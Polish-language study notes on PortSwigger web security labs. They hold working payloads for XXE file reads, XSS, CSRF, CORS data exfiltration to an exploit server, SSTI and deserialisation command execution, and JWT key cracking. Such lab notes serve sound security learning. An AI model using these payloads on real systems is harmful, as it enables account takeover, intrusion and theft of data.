# PORTSWIGGER NOTATKI

## Lab: Inconsistent handling of exceptional input
## Lab: Authentication bypass via flawed state machine
## Lab: Authentication bypass via encryption oracle
## Lab: Authentication bypass via information disclosure ->
## Lab: Information disclosure in version control history -> .git
## Lab: Method-based access control can be circumvented -> pamiętać, żeby zmienić session cookie
## Lab: Web shell upload via extension blacklist bypass -> do zrobienia
## Lab: Remote code execution via polyglot web shell upload -> Ważne żeby sobie dodać przed i po ścieżce START i STOP bo się znaki mogą zmienić 

# SSRF

Lab: SSRF with whitelist-based input filter
1. omijanie whitelisty -> musimy dopasować stock.weliketoshop.net
2. user@strona.pl -> wchodzimy na stronę z whitelisty jako user, tutaj [localhost]
3. http://localhost%252f@stock.weliketoshop.net/admin/delete?username=carlos -> dalsze części zapytania już po stronie z whitelisty
4. zamiana slasha na `%252f` (podwójne encodewanie URL), aby ominąć zabezpieczenia
Jak to działa (chyba)?
	1. serwer sprawdza czy to co jest wpisane jest na whiteliście
		- używa regexa, który szuka najbliższego znaku który zasugeruje że skończyła się nazwa domeny (dlatego encodujemy / dwa razy, żeby przepuścił go jako normalny znak, dalej widzi @, która nie stopuje i zatrzymuje się dopiero na nie-encodowanym /)
	2. przepuszcza zapytanie, ale przez to że dopisaliśmy / przed @ teraz uznaje localhost za link, a nie usera)

## Lab: SSRF with filter bypass via open redirection vulnerability
1. sprawdzamy działanie parametru stockApi, który sprawdza liczbę dosenych produktów i nier pozwala on na wysłanie zapytania na inną stronę
2. sprawdzamy przycisk [next product] i widzimy, że istnieje zapytanie `/product/nextProduct?path=/...`
3. dodajemy to zapytanie do stockApi z path=nasz_serwer i zapytanie się wykonuje

# XXE

## Lab: Exploiting XXE to perform SSRF attacks
1. mamy endpoint, który używa XML
2. wpisujemy `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`
3. znajdujemy miejsce, w którym jest sprawdzana wartość i mamy zwracane [Invalid argument: nazwa folderu] 
4. po kolei dopisujemy kolejne foldery ze ścieżki, aż dochodzimy do rozwiązania

## Lab: Exploiting blind XXE to retrieve data via error messages
1. na naszym serwerze tworzymyh payload:
``` 
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
- tworzy on referencję do zmiennej (% file), do której załadowujemy zawartość /etc/passwd
- tworzy referencję do zmiennej (% eval), która dynamicznie tworzy zapytanie do nieistniejącego pliku (którego nazwą jest zawartość pliku /etc/passwd)
- w "podmiocie" (entity) stworzonym przez wywołanie %eval; tworzymy referencję do zmiennej (%error), która zwróci błąd ponieważ ścieżka nie istnieje
2. na serwerze dodajemy część kodu z zapytaniem:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```
3. serwer wysyła zapytanie i zwracany jest błąd z nazwą ścieżki, która nie istnieje (bo jest to zawartość pliku /etc/passwd)
notatka: nie możemy ostatecznego payloadu wpisać od razu, bo blokowane są entity, a w tym payloadzie, który wysyłamy entity tworzy się dopiero na serwerze


## Lab: Exploiting XXE to retrieve data by repurposing a local DTD
1. poprzez zapytania w typowe miejsca z pikami dtd (Document Type Definition) tj.:
``` 
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
2. jeśli plik nie istnieje zwracany jest błąd
3. dowiadujemy się, że w pliku zdefiniowana jest zmienna ISOamso, bo pliki dtd zazwyczaj są opensource
4. widząc to robimy payload:
```
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
- tworzy się entity do którego wpisujemy zawartość pliku docbookx.dtd
- nadpisujemy entity o nazwie ISOamso, dzięki czemu nie zostanie ono zablokowane
- dalej podobnie jak wcześniej wpisujemy zawartość /etc/passwd, a potem zwracamy błąd z jego zawartością

notatka: zablokowane zą zewnętrzne zapytania oraz tworzenie entity poza serwerem, datego poprzez nadpisanie tego z wnętrza serwera możemy obejść to zabezpieczenie



## Lab: Exploiting XInclude to retrieve files
1. jest to przypadek, że nie mamy dostępu do całego dokumentu XML, a jedynie podajemy parametry do niego
2. należy użyć wtedy `XInclude`, który pozwala na budowanie dokumentów XML, z sub-dokumentów
3. Zamiast parametru podajemy zatem payload (zakodowany URL, zeby mógł być argumentm):
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```
4. Wtedy dosatemy informację: [Invalid product ID: zawartość /etc/passwd]


## Lab: Exploiting XXE via image file upload
XML w obrazie SVG:
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
# XXS

Lab: Reflected XSS into HTML context with most tags and attributes blocked
1. Widzimy, że blokowane są tagi html
2. Enumerujemy po wszystkich i okazuje się, że jako jedyny blokowany nie jest body
3. Blokowane również są eventy.
4. Enumerujemy po wszyskiech eventach i widzimy, że nie jest blokowany onresize
5. Teraz należy wysłać payload do ofiary:
- konstruujemy iframe, który od razu po załadowaniu zmienia szerokość, a zatem wywołuje onresize

```
<iframe src="https://0aff008804477d86c05a1924003d00c4.web-security-academy.net/?search=<body onresize=print()>" onload=width='200px'>
```

## Lab: Reflected XSS into HTML context with all tags blocked except custom ones ->> TODO
```
<script>
location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

## Lab: Reflected XSS with some SVG markup allowed
1. enumerujemy po tagach i eventach
2. dostępny jest tylko event onbegin i tagi svg, image, title, animatetransform
3. z tego tworzymy: 
```
<svg><animatetransform onbegin=alert(1)>
```
Jeśli jesteśmy wewnątrz skryptu:
```
" autofocus onfocus=alert(document.domain) x="
```
Jeśli jesteśmy wewnątrz jakiegoś elementu np 



src="[]"...>:
```
"><script>alert(document.domain)</script>
```
Jeśli jesteśmy wewnątrz stringa w skrypcie:
```
'-alert(document.domain)-'
';alert(document.domain)//
```
Jeżeli jest escapowany znak (używany w tym celu backslash) to można dać przed nim \\\\:
wtedy jeżeli payload jest równy:
``` 
\';alert(document.domain)//
```
po próbie escapowania ' będzie wyglądał tak:
```
\\';alert(document.domain)//
```
a tym samym zamiast escapowania ' zescapowany zostanie backslash, a zatem będzi uznany jako zwykły znak, a nie specjalny.	

Jeżeli escapowany jest również backslash możemy użyć predefiniowanych entity javascripta do znaków np.: \&apos; to ':
```
&apos;-alert(document.domain)-&apos;
```
Można również użyć:
```
${alert(document.domain)}
```
# DOM BASED XSS 

Jeżeli wrzucamy do innerHTML nie są akceptowane np. script i svg (nie bedą odpalone) 
- Wtedy użyć można <frame> albo <img>

Jeżeli mamy on hashchange to można użyć:
```
<iframe src="https://0a15006c031ab25bc000223400ad00a2.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'"> 
```
jak exploit, albo
```
https://0a15006c031ab25bc000223400ad00a2.web-security-academy.net/#<img src=1 onerror=print()>
```
Jeżeli mamy payload do Angulara, to warto sobie poszukać pod konkretny framework:
```
{{$on.constructor('alert(1)')()}}
```

## Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped
1. payload wprowadzony jest do wnętrza skryptu, jednak nie możemy "wyjść" ze stringa, bo znak ' jest usuwany
2. możemy jednak zakończyć całą sekcje skryptu dając payload:
``` 
</script><img src=1 onerror=alert()>
```

## Lab: Reflected DOM XSS
1. Patrzymy na zwracaną wartość:
```
{"results":[],"searchTerm":"podana_wartość"}
```
2. Widzimy jakie znaki są escapowane, podajemy wartość:
```
\"-alert(1)}//
```
3. Co zamienia się w:
```
"\\"-alert(1)}//"
```
i mamy:
```
{"searchTerm":"\\"-alert(1)}//", "results":[]}
```

# CSRF

## Lab: CSRF vulnerability with no defenses
### Skrypt zmieniający adres e-mail:
```
    <html>
        <body>
            <form action="https://0ac4006304f120fbc02b4be100cd00c7.web-security-academy.net/my-account/change-email" method="POST">
                <input type="hidden" name="email" value="pwned@evil-user.net" />
            </form>
            <script>
                document.forms[0].submit();
            </script>
        </body>
    </html>
```
## Lab: CSRF where token is not tied to user session
1. Generujemy CSRF dal użytkownika, wysyłając zapyanie o zmiane maila, zapisujemy je i dropujemy request
2. Sprawdzamy na drugim użytkowniku że podniana jego tokenu na ten działa
3. robimy skrypt, który uruchamia zminae maila z dodanym wcześniej wygenerowanym tokenem
```
    <html>
        <body>
            <form action="https://0a7400fb04acc082c085a8ac00ef0031.web-security-academy.net/my-account/change-email" method="POST">
                <input type="hidden" name="email" value="pwned@evil-user.net" />
                <input type="hidden" name="csrf" value="T27pLkAbqM1BfdJFpw8mEzkHWkTtIM0O" />
            </form>
            <script>
                document.forms[0].submit();
            </script>
        </body>
    </html>
```

- `%0d%0a` -> nowa linia

## Lab:CSRF token is tied to a non-session cookie
1. Jeśli mamy do zmiany dwa parametry warto użyć
`<img src="https://0ac9004504dc6294c0621d30000900a0.web-security-academy.net/?search=12341234%0d%0ASet-Cookie%3a+csrfKey%3dyoJrLzW6dVmSBKMnxPC8ZDk3wCmqjDWM" onerror="document.forms[0].submit()">`, bo wtedy mamy pewność, że zapytania wykonają się w odpowiedniej kolejności
```
    <html>
        <body>
            <form action="https://0ac9004504dc6294c0621d30000900a0.web-security-academy.net/my-account/change-email" method="POST">
                <input type="hidden" name="email" value="pwned@evil-user.net" />
                <input type="hidden" name="csrf" value="iDJaenyZIgBuL3FulGTs64h3SdAfNrIC" />
            </form>
            <img src="https://0ac9004504dc6294c0621d30000900a0.web-security-academy.net/?search=12341234%0d%0ASet-Cookie%3a+csrfKey%3dyoJrLzW6dVmSBKMnxPC8ZDk3wCmqjDWM" onerror="document.forms[0].submit()">
        </body>
    </html>
```

## Lab: CSRF where Referer validation depends on header being present 
1. Z racji, że po usunięciu nagłówka Referer pomijane jest jego sprawdzenie, to należy dodać `<meta name="referrer" content="never">`, który informuje stronę, any takiego nagłówka nie dodawać
2. Cały payhload wygląda tak:
``` 
    <html>
        <body>
            <meta name="referrer" content="never">
            <form action="https://0ab0001b03ab5131c0f5dffe00e50064.web-security-academy.net/my-account/change-email" method="POST">
                <input type="hidden" name="email" value="pwned@evil-user.net" />
            </form>
            <script>
                document.forms[0].submit();
            </script>
        </body>
    </html>
```

## Lab: CSRF with broken Referer validation
1. Ochrona przed CSRF polega na sprawdzaniu pola Referer w nagłówku, sprawdzanie polega jednak tylko na tym czy jest w nim strona, której szuka regex tj. działa również:
`	dobra_strona.zła_strona.com`
`	zla_strona.pl/dobra_strona`
2. Dodatkowo w przeglądarce z zasady ucianae jest to co po slashu, a aby temu zapobiec należy dodać pole `Referrer-Policy: unsafe-url` i wtedy wszystko działa, a linkiem w serwerze jest `strona_z_exploitem.com/dobra_strona`

# CORS

## Lab: CORS vulnerability with basic origin reflection
1. Dopuszczalne jest zapytanie z każdej strony
2. Wystarczy zatem skonstruować taki skrypt:
```
    <script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('get','https://0aca001603b191f3c09503240075004c.web-security-academy.net/accountDetails',true);
        req.withCredentials = true;
        req.send();
    
        function reqListener() {
            location='/log?key='+this.responseText;
        };
    </script>
```

## Lab: CORS vulnerability with trusted null origin
1. Wpisując różne Origin do requesta widzimy że dostajemy nagłówek `Access-Control-Allow-Origin: null` dla wartości Origin: null
2. WAŻNE: to że dostajemy odpowiedź nic nie znaczy, ważne jest żeby był nagłówek, bo nie chodzi o to że będzie blokowany request, a wykonywanie skryptów i przekierowanie cookie
3. Aby w Origin uzyskać wartość null używamy iframe:
```
    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a31007a0301b17dc03f469300ec009e.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    
    function reqListener() {
    location='https://exploit-0a8a000d0307b198c0d6462c01c400a8.web-security-academy.net/log?key='+this.responseText;
    };
    </script>"></iframe>
```

## Lab: CORS vulnerability with trusted insecure protocols

1. Zapytania mogą być generowane jedynie z subdomen
2. Znajdujemy podatność XSS w subdomenie http://stock.0a100003032beefac0af231c00de0028.web-security-academy.net
3. Jako productId możemy wpisać skrypt i będzie on wykonany z tej właśnie subdomeny
4. Konstruujemy skrypt i dodajemy do na exploit server:

Payload:
```
    <script>
        document.location="http://stock.0a100003032beefac0af231c00de0028.web-security-academy.net/?productId=4
    	<script>
    	    var req = new XMLHttpRequest(); 
    	    req.onload = reqListener; 
    	    req.open('get','https://0a100003032beefac0af231c00de0028.web-security-academy.net/accountDetails',true); 
    	    req.withCredentials = true;
    	    req.send();
    
    	    function reqListener() {
    	    location='https://exploit-0a2f009e035fee0ec04523210103003d.web-security-academy.net/log?key='%2bthis.responseText; 
    	    };
    	%3c/script>
        &storeId=1"
    </script>
```

# CLICKJACKING
```
    <head>
    	<style>
    		iframe {
    			position:relative;
    			width:700px;
    			height:600px;
    			opacity:0.51;
    			z-index:2;
    			}
    		div {
    			position:absolute;
    			top:500px;
    			left: 80px;
    			z-index:1;
    			}
    	</style>
    </head>
```
```
    <body>
            <div>
            <button>click</button>
            </div>
    	<iframe src="https://0ae300220338ea26c0e098a70076003a.web-security-academy.net/my-account"> </iframe>
    </body>
```
Jeśli strona blokuje odpalanie jej w framie pomóc może dodanie sandbox="allow-forms":
```
<iframe src="https://0a3d000a04b97a33c050232a0098006e.web-security-academy.net/my-account" sandbox="allow-forms"> </iframe>
```


# DOM-based vunabilities

## Web messages
```
<iframe src="https://0ad400b70311a7c0c07419ee0014008f.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```
	
## Lab: DOM XSS using web messages and a JavaScript URL
1. Widzimy, że stroma pobiera wartość message i sprawdza, czy zawiera http: lub https:, jeśli tak wpisuje ją do href, jeśli nie to nie:
2. Konstruujem zatem payload, który zawiera wywołanie funkcji print, a także słowo http, które poprzedzamy //, aby był to komentarz:
```
<iframe src="https://your-lab-id.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

## Lab: DOM XSS using web messages and JSON.parse
1. Jest to przykład z użyciem JSON.parse, który zmienia string w JSON, należy pamiętać, aby escapować znaki " w stringu, bo inaczej zrobią się z tego osobne stringi i nie zadziała
```
<iframe src="https://0ab200c5041cbdb3c018c71b008d0084.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\", \"url\":\"javascript:print()\"}","*")'>
```

## Lab: DOM-based open redirection
https://0aff009b03b537c9c039ad9c00ff0051.web-security-academy.net/post?postId=7#/url=https://exploit-0a04009b032a3781c0eaade3010e0095.web-security-academy.net


## Lab: DOM-based cookie manipulation
1. W cookie zapisywana jest poprzednia odwiedzana podstrona, możemy zatem ją zmienić , a także dodać skrypt.
2. WAŻNE! - warto sprawdzać dodawanie pojedynczych i podwojnych cudzysłowiów, bo strona nawet pojedyncze tłumaczy na podwójne i potem nie działa
3. działanie skryptu
	- ładujemy stronę z iframea, a do cookie zostanie wpisany lkiink
	- następnie robimy redirect, wtedy załaduje się link do przycisku, a tym samym wykona się skrypt

Payload:
```
<iframe  width=1000px height=1000px src="https://0a8f00a8033e9886c0653d3300fa008e.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="window.location.href = 'https://0a8f00a8033e9886c0653d3300fa008e.web-security-academy.net/';">
```

`Możliwa obfuskacja alert() może być alert```


# INSECURE DESERIALISATION
## PHP
```
String -> s:size:value;
Integer -> i:value;
Boolean ->b:value; (does not store "true" or "false", does store '1' or '0')
Null -> N;
Array -> a:size:{key definition;value definition;(repeated per element)}
Object -> O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}
```
## Java
```
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 > file.txt
```
- tworzy dane zserializowane wykonujące daną komendę


### Lab: Exploiting PHP deserialization with a pre-built gadget chain
1. Jako cookie mamy: `{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJwYjhyaTRoanV4Z2N4Zjg3NWhkdHVnYWtoenBnenozZyI7fQ==","sig_hmac_sha1":"5cb7fbbf74d7f2378516e66ab7b6000df40b94bd"}`
2. Kiedy spojrzymy na wartość tokenu okazuje się, że oznacza ona: `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"pb8ri4hjuxgcxf875hdtugakhzpgzz3g";}`
3. Na stronie w komentarzu znajdujemy informacje o ścieżce do pliku php_info.php
4. W środku znajdujemy `SECRET_KEY`, okazuje się, że `sig_hmac_sha1` to podpisana wartość tokenu tym właśnie kluczem
5. W momencie błedu widać, że wykorzystywany jest framework o nazwie `[Symfony Version: 4.3.6]`
6. Generujemy payload za pomocą funkcji: `phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64`
7. token podmieniamy na tę wartość, a następnie tworzymy skrót `hmac-sha1` i dodajemy jego wynik za `sig_hmac_sha1`
8. Wysyłamy cały payload i działa

# SERVER-SIDE TEMPLATE INJECTION
## Testy:
```
${{<%[%'"}}%\
http://vulnerable-website.com/?username=${7*7}
```
## Payloady:
### Freemaker
```
<%= system("rm morale.txt") %> -> RUBY ERC
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm morale.txt")} -> Freemaker
```

### handlebars
```
    wrtz{{#with "s" as |string|}}
        {{#with "e"}}
            {{#with split as |conslist|}}
                {{this.pop}}
                {{this.push (lookup string.sub "constructor")}}
                {{this.pop}}
                {{#with string.split as |codelist|}}
                    {{this.pop}}
                    {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                    {{this.pop}}
                    {{#each conslist}}
                        {{#with (string.sub.apply 0 codelist)}}
                            {{this}}
                        {{/with}}
                    {{/each}}
                {{/with}}
            {{/with}}
        {{/with}}
    {{/with}} -> handlebars
```

### django
```
{{settings.SECRET_KEY}} -> django
{% debug %} -> django
```

# WEB CACHE POISONING

## Lab: Web cache poisoning with multiple headers
1. Za pomocą Param Miner znajdujemy, dwa "unkeyd" parametry: X-Forwarded-Host i X-Forwarded-Scheme
2. bierzemy zapytanie GET na /resources/.../....js
3. Widzimy, że jeżeli w nagłówku X-Forwarded-Scheme damy cokolwiek innego niż https, to zostaniemy przekierowani na stronę z https
4. Jeśli następnie dodamy nagłówek X-Forwarded-Host, to widzimy, że zostajemy przekierowani właśnie na tę stronę
5. Na exploit serwerze ustawiamy link /resources/.../....js ui dodajemy tam alert()
6. Kiedy strona po tym jak "poisonujemy" cache bedzie załadowywać skrypt z naszej strony

## Lab: Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria
1. Sprawdzamy jakie nagłówki działają w Param Minerze i znajdujemy X-Forwarded-Host
2. Widzimy, że to pole wstawiane jest jako adres do /resources/json/geolocation.json
3. Z pliku geolocation.js widzimy, że używany jest parametr "country"
4. Dodajemy zatem na exploit serwer payload
```
{ "country": "<img src=1 onerror=alert(document.cookie)>" }
```
5. Do nagłówka dodajemy także `Access-Allow-Origin: *`, aby ominąć CORS

## Lab: Web cache poisoning via an unkeyed query string
1. Zauważamy, że niezależnie od dodania parametrów w `GET /`, cały czas dostajemy ten sam cache, oznacza to, że patametry są "unkeyd"
2. Używając Param Minera, znajdujemy nagłówek Origin, który można użyć jako cahce bustera
3. Link, który podajemy w parametrze get jest wpisywany do pola head
4. Aby wyjść z pola i wykonać skrypt używamy payloadu:
```
GET /?param='><script>alert(1)</script>
```
## Lab: Web cache poisoning via an unkeyed query parameter
1. Tym razem parametry w `/ GET` wpływają na cache'owanie strony
2. Używając Param Minera -> `Guess GET Parameters`, znajdujemy parametr, który nie wpływa na cachowanie, jest to utm_content
3. Dalej tak samo jak w poprzednim zadaniu:
```
GET /?utm_content='><script>alert(1)</script>
```
## Lab: Parameter cloaking
1. Używając Param Minera -> `Guess GET Parameters`, znajdujemy parametr, który nie wpływa na cachowanie, jest to utm_content
2. Znajdujemy plik /js/geolocate.js, który wywoływany jest przy ładownaiu strony zapytaniem /js/geolocate?callback=setCountryCookie
3. Próbując wpisywać różne payloady zayważamy, że `;` nie przerywa zapytania, a jest interpretowany jako dalsza część parametru
4. Inaczej jest jednak na back endzie, gdzie jest interpretowany jako przerwa i następuje po nim inna zmienna
5. Dodatkowo jeżeli znienne mają takie same nazwy pierwsza zostaje nadpisana przez drugą, jednak w cachu zostaje zapamiętana pierwsza z nich
6. Konstruujemy zatem payload
``` 
GET /js/geolocate.js?callback=setCountryCookie&utm_content=123;callback=alert
```
Co się dzieje?
- serwer cachujący widzi zapytanie z dwoma parametrami: 
	- `callback=setCountryCookie`, które jest kluczem w cachu oraz 
	- `utm_content=123;callback=alert` czyli parametr utm_content, który cachowany nie jest
	- SERWER ZATEM CACHUJE ZAPYTANIE DLA `callback=setCountryCookie`
- serwer na backendzie (tutaj Ruby on Rails) widzi trzy parametry:
	- `callback=setCountryCookie`
	- `utm_content=123`
	- `callback=alert`, I NIM NADPISUJE PIERWSZY Z PARAMETRÓW

## Lab: Web cache poisoning via a fat GET request
1. Zauważamy, że możemy nadpisać parametr z adresu URL parametrem w body
2. Tak jak w poprzednim przykładzie mamy zapytanie: `GET /js/geolocate.js?callback=setCountryCookie`
3. W body dopisujemy
```
callback=alert
```
!Notatka -> często strony nie pozwalają na zapytania GET z body, wtedy można spróbować nadpisać metodę:
```
GET /?param=innocent HTTP/1.1
Host: innocent-website.com
X-HTTP-Method-Override: POST
…
param=bad-stuff-here
```

## Lab: URL normalization
1. Zauważamy, że czegokolwiek nie wpiszemy do GET /[cokolwiek] serwer wyświetla stronę z napisanym: `Not Found: [cokolwiek]`
2. W Burp Reapeterze wpisujemy zatem GET /<script>aletr()</script>, co jest cachowane
3. Ofierze wysyłamy link `https://0a7d002d04cfd55ac0c47e8400c90006.web-security-academy.net/<script>alert(1)</script>`, który przeglądarka przekształci na `https://0a7d002d04cfd55ac0c47e8400c90006.web-security-academy.net/%3Cscript%3Ealert(1)%3C/script%3E`
4. Dla serwera jednak są to tożsame zapytania, dlatego wyświetli zcachowana odpowiedź z wykonywalnym skryptem'

# HTTP Host Header Attacks

## Lab: Basic password reset poisoning
1. Sprawdzamy działanie mechanizmu zmiany hasła na swoim koncie
2. Testując podmienianie adresu w różnych polach nagłówka zauważamy, że email wysyłany jest z linkiem do domeny podanej w polu `Host`
3. Robimy zatem reset hasła dla użytkownika carlos wstawiając do pola `Host` adres serwera exploit
4. Z racji, że carlos klika w każdy link, to w Access Logu mamy zapytanie zawierające token do zmiany hasła
5. Używając go zmieniamy hasło carlosa

## Lab: Web cache poisoning via ambiguous requests
1. Testujemy działanie pola `Host`
2. Zauważamy, że jego wartość jest (najprawdopodobniej wpisywana w pole z linkiem do pliku .js: .../resources/js/tracking.js
3. Jeżeli zmienimy adres host dostajemy błąd, ponieważ pośredniczący serwer najprawdopodobiej nie ma dostępu do serwera o takiej domenie
4. Jeżeli natomiast dopiszemy drugi taki samo pole `Host`, jednak podamy tam inną wartość zapytanie zadziała a do dokumentu zostanie wpisana wartość ze zduplikowanego pola
5. Do drugirgo pola wpisujemy adres serwera exploit, a na nim dajemy odpowiednią ścieżkę oraz w body `alert(document.cookie)`

# OAuth 2.0

## Lab: Forced OAuth profile linking
1. Logujemy się i przechodzimy przez cały proces łączenia konta na stronie z tym na mediach społecznościowych.
2. Widzimy, że można teraz zalogować się zarówno kontem na stronie, jak i tym z mediów społecznościowych (teraz już bez wpisywania danych, ale nie ma to znaczenia)
3. Musimy zatem stworzyć payload, którym administrator połączy nasze konto (z mediów społecznościowych) ze swoim na stronie
4. Przechodzimy znowu do łacznia konta z kontem z mediami połecznościowymi i dochodzimy do momentu, gdzie mamy wygenerowane i pokazane client_id, jest to id klienta, z którego kontem będzie połączone konto z MS, nie ma tokenu CSRF (w OAuth jest to parametr `state`), a zatem i ochrony przed takim atakiem
5. W tym momencie dropujemy request, aby kod client_id nie został zużyty i link przesyłamy do ofiary w następującej formie:
```
<iframe src="https://0a4d004f04cb3a63c0382da90041006d.web-security-academy.net/oauth-linking?code=aKsHIS3bGFzKEN-EDD0918bQIjTaeSLtw0mmnW4v8e8"> </iframe>
```
6. Następnie logujemy się przez konto społecznościowe i zostajemy przekierowani na konto administracyjne, skąd usuwamy carlosa

## Lab: OAuth account hijacking via redirect_uri
1. Logujemy się przez konto na mediach społecznościowych.
2. Teraz po wylogowaniu nie musimy już wpisywać loginu ani hasła, a wystarczy nacisnąć przycisk logowania i jesteśmy uwierzytelniani.
3. Ostatecznie jesteśmy logowani, poprzez przekierowanie na `[adres_strony]/oath-callback?code=[tajny_token]`
4. Jesteśmy zatem w stanie zalogować się na dowolne konto posiadając taki token do niego przypisany (pod warunkiem, że nie został już użyty).
5. Wysyłając poprzednie zapytanie do Burp Reapeatera możemy zauważyć, że [strona] jest pobierana z wysyłanej wartości redirect_uri
6. Konstruujemy zatem payload, jest to to samo zapytanie jednak z podmienioną wartością redirect_uri wskazującą na nasz serwer, przez co zostanie wysłane na niego zapytanie z wartością token u
7. Payload
```
<iframe src="https://YOUR-LAB-OAUTH-SERVER-ID.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net&response_type=code&scope=openid%20profile%20email"></iframe>
```
8. Przechodzimy przez qproces logowania i w momencie zapytanie z `/oauth-callback` podmieniamy tokeny


# JWT

## Konstrukcja JWT
```
eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA

header_base64.payload_base64.signature
```
```
Header decoded:
{
    "kid":"9136ddb3-cb0a-4a19-a07e-eadf5a44c8b5",
    "alg":"RS256"
}

Payload decoded:
{
    "iss": "portswigger",
    "exp": 1648037164,
    "name": "Carlos Montoya",
    "sub": "carlos",
    "role": "blog_author",
    "email": "carlos@carlos-montoya.net",
    "iat": 1516239022
}

```
## Lab: JWT authentication bypass via flawed signature verification
1. Widzimy, że w nagłówku jest podany jaki algorytm podpisu jest używany.
2. Jest również opcaj wpisanaia none, a wtedy podpisywanie jest pomijane (ale `.` na końcu musi zostać)
3. Aby zalogować się na panel administracyjny (`/admin`) musimy mieć konto o nazwie administrator
4. W payloadzie podmieniamy zatem nazwę użytkownika na administrator oraz algorytm podpisywania na none, (pamiętać, że none również wpisujemy w `" "`
5. Usuwamy podpis z payloadu
6. Logujmy się podmieniając stare cookie na nowo stworzony payload

## Lab: JWT authentication bypass via weak signing key
1. Logujemy się i znajdujemy JWT, do panelu administracyjnego możemy dostać się poprzez konto administratora
2. Wystarczy zmienić nazwę użytkownika w JWT oraz podpisać je odpowiednim kluczem
3. Aby poznać klucz musimy złamać klucz używamy listy popularnych kluczy: https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list oraz hashcata:
```
hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
```
4. Znajdujemy klucz `secret1` i importujemy go do `JWT Editora`:
5. JWT Editor Keys -> Add Symertic Key -> Generate -> podmieniamy `k` na `secret1` zakodowane w base64, czyli `c2VjcmV0MQ==`
6. Wchodzimy do zakładki JWT Editor w Burp Reapeter podmieniamy nazwę użytkownika w payloadzie i podpisujemy
7. Następnie tak skonstruowsane JWT przeklejamy do cookie i wchodzimy na panel administracyjny.

## Lab: JWT authentication bypass via jwk header injection
Nagłówek JWK mówi serwerowi jaki klucz powinien zostać użyty do sprawdzenia podpisu w wiadomości. Przykład takiego nagłówka:
```
{
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
    }
}
```
